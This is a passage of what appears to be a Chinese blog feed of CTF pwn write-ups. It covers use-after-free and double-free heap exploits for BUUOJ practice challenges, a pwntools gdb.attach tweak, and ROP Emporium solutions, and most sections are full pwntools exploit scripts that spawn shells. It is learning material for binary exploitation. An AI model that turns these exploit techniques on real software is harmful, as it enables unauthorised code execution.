dbg()sla(&#39;s you name?&#39;,payload)itr()</code></pre><h2 id="å…¥é—¨reverse"><a href="#å…¥é—¨reverse" class="headerlink" title="å…¥é—¨reverse"></a>å…¥é—¨reverse</h2><pre><code class="python">s = &#39;akhb~chdaZrdaZudqduvdZvvv|&#39;flag = &#39;&#39;for i in range(26):    flag += chr((ord(s[i]) - 1) ^ 6)print(flag)</code></pre><h2 id="Encrypts"><a href="#Encrypts" class="headerlink" title="Encrypts"></a>Encrypts</h2><p>ç›´æ¥çˆ†ç ´äº†ã€‚</p><pre><code class="python">s = [38,44,33,39,59,35,34,115,117,114,113,33,36,117,118,119,35,120,38,114,117,113,38,34,113,114,117,114,36,112,115,118,121,112,35,37,121,61]for i in range(128):    flag = &#39;&#39;    for j in range(38):        flag += chr(s[j] ^ i)    if flag[:4] == &#39;flag&#39;:        print(flag)</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>re</tag>
      
      <tag>rop</tag>
      
      <tag>uaf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>uafå’Œdouble free</title>
    <link href="/2020/04/25/uaf%E5%92%8Cdouble%20free/"/>
    <url>/2020/04/25/uaf%E5%92%8Cdouble%20free/</url>
    
    <content type="html"><![CDATA[<h1 id="uafå’Œdouble-free"><a href="#uafå’Œdouble-free" class="headerlink" title="uafå’Œdouble free"></a>uafå’Œdouble free</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘å¼€å§‹æ‰“ç®—å…¥é—¨å †ï¼Œç®€å•è®°å½•å‡ é“ç›¸å…³çš„é¢˜ã€‚</p><h2 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining-uaf"></a>hitcontraining-uaf</h2><p>é¢˜ç›®è¾ƒä¸ºç®€å•å­˜åœ¨åé—¨å‡½æ•°ï¼Œåˆ©ç”¨uafæ¼æ´æ”»å‡»å³å¯ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./hacknote&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27892)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()def add(size,content):    sl(&#39;1&#39;)    ru(&#39;Note size &#39;)    sl(str(size))    ru(&#39;Content :&#39;)    sl(str(content))def dele(index):    sl(&#39;2&#39;)    sl(str(index))def show(index):    sl(&#39;3&#39;)    sl(str(index))ru(&#39;Your choice :&#39;)add(16,&#39;aaaa&#39;)ru(&#39;Your choice :&#39;)add(16,&#39;bbbb&#39;)ru(&#39;Your choice :&#39;)dele(0)ru(&#39;Your choice :&#39;)dele(1)ru(&#39;Your choice :&#39;)add(8,p32(elf.symbols[&#39;magic&#39;]))ru(&#39;Your choice :&#39;)show(0)itr()</code></pre><h2 id="ACTF-2019-babyheap"><a href="#ACTF-2019-babyheap" class="headerlink" title="ACTF_2019_babyheap"></a><code>ACTF_2019_babyheap</code></h2><p>é¢˜ç›®æœ‰systemå‡½æ•°ï¼Œå¹¶ä¸”ä¹Ÿæœ‰<code>/bin/sh\x00</code> ï¼Œå½“æ—¶åœ¨æ„é€ è¿™ä¸ª<code>/bin/sh\x00</code>çš„å­—ç¬¦ä¸²æŒ‡é’ˆçš„æ—¶å€™è´¹äº†ä¸€ç‚¹åŠ²ï¼Œç»“æœå‘ç°elfæœ‰è¿™ä¸ªå­—ç¬¦ä¸²ã€‚ç„¶åå°±å¾ˆç®€å•äº†ï¼Œæ§åˆ¶å¥½å‚æ•°å³å¯ã€‚è¿˜æ˜¯uafæ¼æ´è¿›è¡Œæ”»å‡»ã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./ACTF_2019_babyheap&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6&#39;debug = 1 if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27341)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()def add(size,content):    sla(&#39;Your choice: &#39;,&#39;1&#39;)    sla(&#39;size: \n&#39;,str(size))    sa(&#39;content: \n&#39;,str(content)) def dele(index):    sla(&#39;: &#39;,&#39;2&#39;)    sla(&#39;index: \n&#39;,str(index))def show(index):    sla(&#39;: &#39;,&#39;3&#39;)    sla(&#39;index: \n&#39;,str(index))add(32,&#39;aaaaaaaa&#39;) #0add(32,&#39;bbbbbbbb&#39;) #1dele(0)dele(1)binsh = 0x602010add(16,flat(binsh,elf.plt[&#39;system&#39;]))# dbg()show(0)itr()</code></pre><h2 id="actf-2019-message"><a href="#actf-2019-message" class="headerlink" title="actf-2019-message"></a>actf-2019-message</h2><p>Double freeï¼Œè¿ç§»åˆ°ä¼ªé€ çš„å †å—ï¼Œæ³¨æ„æ§åˆ¶å¥½ä¼ªé€ å †å—çš„sizeè·Ÿfastbinçš„å¯¹åº”ã€‚<br>æ”¹<code>__free_hook</code>ä¸ºsystemå³å¯ã€‚<code>__free_hook</code>çš„å‚æ•°æ­£å¥½æ˜¯å †å—çš„dateï¼Œè¾ƒå¥½æ§åˆ¶ã€‚<br>ï¼ˆbuuç»™çš„å¤ç°ç¯å¢ƒæ˜¯18çš„ï¼Œæœ‰äº†tcacheæœºåˆ¶ï¼Œä½†æ˜¯æœ¬äººè¿˜ä¸å¤ªç†Ÿæ‚‰ï¼Œåªæ˜¯çŸ¥é“ä¸æ£€æŸ¥sizeæ˜¯å¦å¯¹åº”äº†ï¼Œåœ¨16ä¸Šåšçš„ï¼Œç„¶åå°±è°ƒè¯•æ”¹äº†æ”¹è„šæœ¬ï¼Œæ‰“é€šäº†buuçš„å¤ç°ç¯å¢ƒã€‚ä¸‹é¢çš„expä¹Ÿæ˜¯18çš„ã€‚ï¼‰</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./ACTF_2019_message&#39;# local_libc  = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;# remote_libc = local_libc # &#39;../libc.so.6&#39;debug = 1if debug:    io = process(local_file)    # libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,25390)    # libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()def add(length,contend) :    sla(&#39;choice: &#39;,&#39;1&#39;)    sla(&#39;length of message:\n&#39;,str(length))    sa(&#39;message:\n&#39;,str(contend))def free(index):    sla(&#39;choice: &#39;,&#39;2&#39;)    sla(&#39;to delete:\n&#39;,str(index))def edit(index,contend):    sla(&#39;choice: &#39;,&#39;3&#39;)    sla(&#39;to edit:\n&#39;,str(index))    sa(&#39;the message:\n&#39;,str(contend))def show(index):    sla(&#39;choice: &#39;,&#39;4&#39;)    sla(&#39;to display:\n&#39;,str(index))add(0x30,&#39;a&#39;) #0add(0x20,&#39;a&#39;) #1add(0x20,&#39;a&#39;) #2free(1)free(2)free(1)add(0x20,p64(0x602068))add(0x20,&#39;aaaaaaaa&#39;)add(0x20,&#39;aaaaaaaa&#39;)contend = p64(elf.got[&#39;puts&#39;])# + p64(0x30) + p64(elf.got[&#39;puts&#39;])add(0x20,contend)show(0)ru(&#39; message: &#39;)puts = uu64(r(6))libc_base = puts - libc.symbols[&#39;puts&#39;]free_hook = libc_base + libc.symbols[&#39;__free_hook&#39;]print(&#39;puts&#39; + hex(puts))print(&#39;libc_base&#39; + hex(libc_base))system = libc_base + libc.symbols[&#39;system&#39;]contend = p64(free_hook)dbg()edit(6,contend)# dbg()contend = p64(system)edit(0,contend)# dbg()add(0x8,&#39;/bin/sh\x00&#39;)free(7)itr()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>å­¦ä¹ è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwntoolsçš„gdb.attach</title>
    <link href="/2020/04/20/pwntools%E7%9A%84gdb.attach/"/>
    <url>/2020/04/20/pwntools%E7%9A%84gdb.attach/</url>
    
    <content type="html"><![CDATA[<h1 id="pwntoolsçš„gdb-attach"><a href="#pwntoolsçš„gdb-attach" class="headerlink" title="pwntoolsçš„gdb.attach"></a>pwntoolsçš„gdb.attach</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘åœ¨å°è¯•å­¦ç€æ›´å¿«çš„è°ƒè¯•expï¼Œå¾ˆæ—©å°±äº†è§£åˆ°è¿™ä¸ªgdb.attachï¼Œä½†æ˜¯æœ¬äººæ˜¯sshè¿ä¸Šå»çš„ï¼Œæ ¹æœ¬ç”¨ä¸äº†ã€‚ç„¶åå°è¯•tmuxè¿™ä¸ªç¥å™¨ï¼Œæ¥å®ç°gdb.attachã€‚æˆåŠŸä»¥åå‘ç°ä¸€ä¸ªä¸å¥½çš„ç‚¹ï¼Œpwntools gdb.attachä¸Šçš„gdbè°ƒè¯•ä¸­ï¼Œå¾ˆå¤šå‡½æ•°æ˜¯æ²¡æœ‰ç¬¦å·è¡¨çš„ï¼Œè°ƒè¯•èµ·æ¥åè€Œéš¾åº¦å¢åŠ ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/QGWqDH.png" srcset="/img/loading.gif" alt><br>è‡ªå·±æ‰‹åŠ¨gdb.attachä¸Šå»ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/acimnJ.png" srcset="/img/loading.gif" alt><br>ç„¶åå‘ç°è°·æ­Œä¹Ÿè°·æ­Œä¸å‡ºæ¥ï¼Œå°±æ¥æŠ˜è…¾æºç äº†ã€‚<br><strong>ç‰ˆæœ¬å· ï¼špwntools (4.0.1)</strong></p><h2 id="æ”¹å–„"><a href="#æ”¹å–„" class="headerlink" title="æ”¹å–„"></a>æ”¹å–„</h2><p>å› ä¸ºæ­£å¸¸æœ¬äººéƒ½æ˜¯</p><pre><code>chumen77@chumen-77:~$ gdb at pid</code></pre><p>è¿™æ ·æ¥è¿›è¡Œattachã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/JxHuUC.png" srcset="/img/loading.gif" alt><br>å‘ç°ç”¨pwntoolsæ—¶å€™ï¼Œå®ƒè¿›è¡Œçš„å‘½ä»¤æ˜¯è¿™æ ·çš„ï¼Œç„¶åæ€è·¯å°±æ¥äº†æ‰¾åˆ°ç›¸å…³æºç ï¼Œæ”¹ä¸€ä¸‹å°±å¥½äº†ã€‚</p><h3 id="æ‰¾å…³é”®å¤„"><a href="#æ‰¾å…³é”®å¤„" class="headerlink" title="æ‰¾å…³é”®å¤„"></a>æ‰¾å…³é”®å¤„</h3><pre><code>/running in new terminal</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/8T9BqG.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/BlYHnW.png" srcset="/img/loading.gif" alt><br>åˆ é™¤2è¡Œå’Œä¿®æ”¹ä¸€è¡Œä»£ç ï¼ˆ<code>-q æ”¹æˆ at</code>ï¼‰å³å¯ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/XUD2ZW.png" srcset="/img/loading.gif" alt><br>å‘ç°å·²ç»å¯ä»¥äº†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>æ‚é¡¹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ropemporium é€šå…³è®°å½•</title>
    <link href="/2020/04/13/Ropemporium%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/04/13/Ropemporium%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Ropemporium-é€šå…³è®°å½•"><a href="#Ropemporium-é€šå…³è®°å½•" class="headerlink" title="Ropemporium é€šå…³è®°å½•"></a>Ropemporium é€šå…³è®°å½•</h1><h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><h3 id="ä¿æŠ¤å’Œarch"><a href="#ä¿æŠ¤å’Œarch" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>é¢˜ç›®ç»™äº†æç¤ºï¼Œ32çš„bufå´å¯ä»¥å¡«å……50ä¸ªå­—èŠ‚ã€‚å¹¶ä¸”æ¥å—ç”¨çš„æ˜¯fgetsï¼Œè¿™ä¸ªå‡½æ•°ä¸ç”¨æ‹…å¿ƒç©ºå­—èŠ‚ã€‚</p><pre><code class="c">int ret2win(){  printf(&quot;Thank you! Here&#39;s your flag:&quot;);  return system(&quot;/bin/cat flag.txt&quot;);}</code></pre><p>å¹¶ä¸”å­˜åœ¨æ¼æ´å‡½æ•°ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><h4 id="32ä½"><a href="#32ä½" class="headerlink" title="32ä½"></a>32ä½</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./ret2win32&#39;)io.recvuntil(&#39;&gt;&#39;)payload = &#39;a&#39; * 44 + p32(0x08048659)io.sendline(payload)io.interactive()</code></pre><h4 id="64ä½"><a href="#64ä½" class="headerlink" title="64ä½"></a>64ä½</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./ret2win&#39;)io.recvuntil(&#39;&gt;&#39;)payload = &#39;a&#39; * 40 + p64(0x00000400811)io.sendline(payload)io.interactive()</code></pre><h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><h3 id="ä¿æŠ¤å’Œarch-1"><a href="#ä¿æŠ¤å’Œarch-1" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="idaåˆ†æ-1"><a href="#idaåˆ†æ-1" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code class="c">int usefulFunction(){  return system(&quot;/bin/ls&quot;);}</code></pre><p>åé—¨å‡½æ•°å˜æˆäº†è¿™æ ·ï¼Œä½†æ˜¯å¯ä»¥çœ‹åˆ°æœ‰cat flagçš„å­—ç¬¦ä¸²ã€‚è¿™æ ·åªéœ€è¦æ§åˆ¶systemçš„å‚æ•°å³å¯ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/aPvOxL.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/qQOFlI.png" srcset="/img/loading.gif" alt></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><h4 id="32ä½ï¼š"><a href="#32ä½ï¼š" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./split32&#39;)key = 0x0804A030 # /bin/cat flag.txt&#39;io.recvuntil(&#39;&gt;&#39;)offset = 44payload = &#39;a&#39; * offset + p32(0x08048657) + p32(0x0804A030)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h4 id="64ä½ï¼š"><a href="#64ä½ï¼š" class="headerlink" title="64ä½ï¼š"></a>64ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./split&#39;)io.recvuntil(&#39;&gt;&#39;)key = 0x00601060 # /bin/cat flag.txt&#39;offset = 40pop_rdi_ret = 0x0000000000400883payload = &#39;a&#39; * offset + p64(pop_rdi_ret) + p64(key) + p64(0x00000400810) io.sendline(payload)io.interactive()</code></pre><h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><h3 id="idaåˆ†æ-2"><a href="#idaåˆ†æ-2" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code class="c">void __noreturn usefulFunction(){  callme_three(4LL, 5LL, 6LL);  callme_two(4LL, 5LL, 6LL);  callme_one(4LL, 5LL, 6LL);  exit(1);}</code></pre><p>è¿™ä¸ªæ˜¯å…³é”®å‡½æ•°ï¼Œä½†æ˜¯å…¶æ˜¯ç”¨åˆ°äº†ç»™çš„soæ–‡ä»¶ï¼Œç„¶åidaæ¥åˆ†æsoæ–‡ä»¶ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/FgKhVy.png" srcset="/img/loading.gif" alt><br>æ‰¾åˆ°ä»¥åå‘ç°åº”è¯¥æ˜¯æŒ‰ç…§é¡ºåºè°ƒç”¨<code>callme-oneï¼Œcallme-twoï¼Œcallme-three</code>éœ€è¦æ³¨æ„å…¶å‚æ•°éƒ½è¦æ˜¯1ï¼Œ2ï¼Œ3.å½“åˆç¨‹åºä¸­ç»™çš„æ˜¯4ï¼Œ5ï¼Œ6 éœ€è¦æƒ³åŠæ³•æ¥æ¢æ‰è¿™ä¸ªå‚æ•°ã€‚</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h4 id="32ä½ï¼š-1"><a href="#32ä½ï¼š-1" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./callme32&#39;)io.recvuntil(&#39;&gt;&#39;)offset = 44callme_one = 0x080485C0callme_two = 0x08048620callme_three = 0x080485B0pop3_ret = 0x080488a9payload = &#39;a&#39; * offset + p32(callme_one) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)payload += p32(callme_two) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)payload += p32(callme_three) + p32(0xdeadbeef) + p32(1) + p32(2) + p32(3)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><p>å…¶ä¸­<code>pop3_ret</code> æ˜¯ç”¨æ¥ä¿æŒæ ˆå¹³è¡¡çš„ï¼Œä¸”ç«™çš„ä½ç½®å‡½æ•°çš„è¿”å›åœ°å€ã€‚è¿˜æœ‰éœ€è¦æ³¨æ„çš„é—®é¢˜æ˜¯ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/9PV8oL.png" srcset="/img/loading.gif" alt><br>æ³¨æ„å¡«å……ä»¥åçš„è¿”å›åœ°å€å¡«çš„æ—¶å€™ï¼Œé€šå¸¸å¡«çš„æ˜¯ä»£ç æ®µçš„æ•°æ®ï¼Œä½†æ˜¯è¿™é‡Œæ±‡ç¼–æ˜¯<code>call</code>æ‰€ä»¥åœ¨å¡«çš„æ—¶å€™ï¼Œåº”è¯¥æ˜¯å¡«å……å…¶pltçš„åœ°å€ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/HxXaWe.png" srcset="/img/loading.gif" alt></p><h4 id="64ä½ï¼š-1"><a href="#64ä½ï¼š-1" class="headerlink" title="64ä½ï¼š"></a>64ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./callme&#39;)io.recvuntil(&#39;&gt;&#39;)offset = 40callme_one = 0x00401850callme_two = 0x000401870callme_three = 0x00401810pop3_ret = 0x0000000000401ab0payload = &#39;a&#39; * offset + p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_one)payload += p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_two)payload += p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_three)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><p>åˆ©ç”¨ <code>0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret</code>è¿™ä¸ªgadgetæ¥æ§åˆ¶å‚æ•°ã€‚</p><h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><h3 id="idaåˆ†æ-3"><a href="#idaåˆ†æ-3" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>è¿™ä¸ªé¢˜è·Ÿå‰é¢ç¬¬2é¢˜å¾ˆåƒï¼Œä½†æ˜¯å°±æ˜¯æ²¡æœ‰ç»™ä½ <code>cat flag</code> çš„å­—ç¬¦ä¸²äº†ã€‚éœ€è¦è‡ªå·±ç”¨ç¨‹åºçš„gadgetæ¥æ„é€ ã€‚æ€è·¯ä¹Ÿå°±æ˜¯è¿›è¡ŒropæŠŠ<code>/bin/sh</code>å¾€bssæ®µä¸Šå†™,ç„¶åæ¥ç€æ‹¿shellå°±å¥½äº†ã€‚</p><pre><code>ROPgadget --binary ./write4 --only &quot;mov|pop|ret&quot;</code></pre><p><strong>æŸ¥å¥½ç”¨çš„gadgetsï¼š</strong><br><img src="http://qiqianyun.chumen77.xyz/uPic/pY6tBk.png" srcset="/img/loading.gif" alt><br>åˆ©ç”¨è¿™å³å¯å°±å¯ä»¥äº†ï¼Œ32ä½çš„ç±»ä¼¼ã€‚</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><h4 id="32ä½ï¼š-2"><a href="#32ä½ï¼š-2" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./write432&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./write432&#39;)# bin_sh = elf.search(&#39;/bin/cat&#39;).next()offset = 44bss = 0x804A06C-0x10pop_edi_pop_ebp_ret = 0x080486dasystem = 0x8048430key = 0x08048670 #mov dword ptr [edi], ebp ; retpayload = &#39;a&#39; * offset + flat([pop_edi_pop_ebp_ret,bss,&#39;sh\x00\x00&#39;,key,system,0xdeadbeef,bss])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h4 id="64ä½ï¼š-2"><a href="#64ä½ï¼š-2" class="headerlink" title="64ä½ï¼š"></a>64ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./write4&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./write4&#39;)# bin_sh = elf.search(&#39;/bin/cat&#39;).next()offset = 40bss = 0x601090-0x10key1 = 0x0000000000400820# mov qword ptr [r14], r15 ; retkey2 = 0x0000000000400890# pop r14 ; pop r15 ; retkey3 = 0x0000000000400893#pop rdi ; retsystem = 0x000004005E0payload = &#39;a&#39; * offset + flat([key2,bss,&#39;/bin/sh\x00&#39;,key1,key3,bss,system])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><h3 id="idaåˆ†æ-4"><a href="#idaåˆ†æ-4" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>è¿™ä¸ªé¢˜ç›®è·Ÿå‰ä¸€ä¸ªwrite4ååˆ†çš„ç›¸ä¼¼ï¼Œä½†æ˜¯å…¶è¿‡æ»¤äº†ä¸ªåˆ«å­—ç¬¦ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/C2HXoN.png" srcset="/img/loading.gif" alt><br>ä¼šå°†å…¶æ›¿æ¢ä¸º<code>0xEB</code>ï¼Œä¸ªäººè§£å†³åŠæ³•å°±æ˜¯åœ¨bssæ®µå†™å¥½è¢«ç¨‹åºå¤„ç†è¿‡çš„å­—ç¬¦ä¸²åï¼Œåœ¨ç”¨xorçš„gadgetsæ¥é‡æ–°æ”¹å›æ¥ï¼Œä¸ºäº†ä¾¿äºåˆ©ç”¨ï¼Œ32ä½å’Œ64ä½éƒ½æ˜¯æ„é€ <code>system(sh)</code>æ¥æ‹¿çš„shellã€‚<br>ä¾‹å­ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/4tnNv7.png" srcset="/img/loading.gif" alt><br>ä¼ è¿‡å»çš„æ˜¯<code>sh\x00\x00\x00\x00\x00\x00\x00</code> åˆ°bssæ˜¯è¿™ä¸ªæƒ…å†µï¼Œç„¶åå»æ‰¾xorçš„gadgetï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/4OvcwS.png" srcset="/img/loading.gif" alt><br>å…¶ä¸­æ³¨æ„è¿™æ˜¯ä»¥ä¸€ä¸ªbyteæ¥è¿›è¡Œxorçš„ï¼Œç„¶åè¿™ä¸ªå›¾xorçš„å€’æ•°ç¬¬ä¸€æ¡è¯­å¥ï¼Œ**å…¶ä¸­çš„æ˜¯dhï¼Œè¿™ä¸ªæ˜¯edxçš„é«˜ä½ã€‚r14bæ˜¯r14çš„ä½ä½ä¹Ÿæ˜¯ä¸€ä¸ªbyteçš„å­—èŠ‚å•ä½ã€‚<br>è¿™ä¸ªé¢˜ç›®åœ¨gdbè°ƒè¯•expæ—¶ä¼šå‘ç°æœ‰æ¯”è¾ƒä¾¿æ·çš„åŠæ³•ã€‚</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><h4 id="32ä½ï¼š-3"><a href="#32ä½ï¼š-3" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./badchars32&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./badchars32&#39;)key1 = 0x08048893# mov dword ptr [edi], esi ; retkey2 = 0x08048899# pop esi ; pop edi ; retkey3 = 0x08048461# pop ebx ; retbss = 0x804A06C-10key4 = 0x08048897# pop ecx ; retkey5 = 0x08048890#xor byte ptr [ebx], cl ; retsys = 0x080484E0offset = 44payload = &#39;a&#39; * offset + flat([key2,&#39;sh\x00\x00&#39;,bss,key1,key3,bss,key4,0x98,key5,sys,0xdeadbeef,bss])raw_input(&quot;-&gt;&quot;)io.sendline(payload)io.interactive()</code></pre><h4 id="64ä½ï¼š-3"><a href="#64ä½ï¼š-3" class="headerlink" title="64ä½ï¼š"></a>64ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./badchars&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./badchars&#39;)offset = 40bss = 0x6010B0key1 = 0x0000000000400b34# mov qword ptr [r13], r12 ; retkey2 = 0x0000000000400b3b# pop r12 ; pop r13 ; retkey3 = 0x0000000000400b39#pop rdi ; retkey4 = 0x0000000000400b30#xor byte ptr [r15], r14b ; retkey5 = 0x0000000000400b40#pop r14 ; pop r15 ; retsystem = 0x004006F0payload = &#39;a&#39; * offset + flat([key2,&#39;sh\x00\x00\x00\x00\x00\x00&#39;,bss,key1,key5,0x98,bss,key4,key3,bss,system])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="fluff"><a href="#fluff" class="headerlink" 